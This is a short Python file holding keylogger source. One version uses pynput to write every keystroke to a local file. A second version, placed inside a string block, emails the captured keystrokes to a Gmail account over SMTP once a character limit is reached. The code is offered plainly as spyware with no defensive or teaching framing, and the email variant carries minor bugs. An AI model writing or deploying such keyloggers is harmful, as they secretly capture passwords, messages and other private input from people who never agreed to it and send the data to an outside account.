from pynput.keyboard import Key, Listener
import logging

log_dir = ""

logging.basicConfig(filename=(log_dir+"keylogs.txt"), \
                    level=logging.DEBUG,format='%(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as Listener:
    Listener.join()


    
                                                            #or

"""
import getpass
import smtplib
from pynput.keyboard import Key,Listener
# set up an email
email = "xyz"
password = "xyz"
server = smtplib.SMTP_SSL('smtp.gmail.com',465)
server.login(email,password)
#logger
full_log =""
word = ""
email_char_limit = 50
def on_press(key):
    global word
    global full_log
    global email
    global email_char_limit
    if key == key.space or key == key.enter:
        word += ' '
        full_log += word
        word = ''
        if len(full_log) >= email_char_limit:
            send_log()
            full_log = ''
    elif key == key.shift_l or key == key.shift_r:
        return
    elif key == key.backspace:
        word = word[:-1]
    else:
        char = f'{key}'
        char = char[1:-1]
        word += char
    if key == key.esc:
        return False
def send_log():
    server.sendmail(
        email,
        email,
        full_log
    )
    with Listener (on_press=on_press) as Listener:
        Listener.join()
        
        """
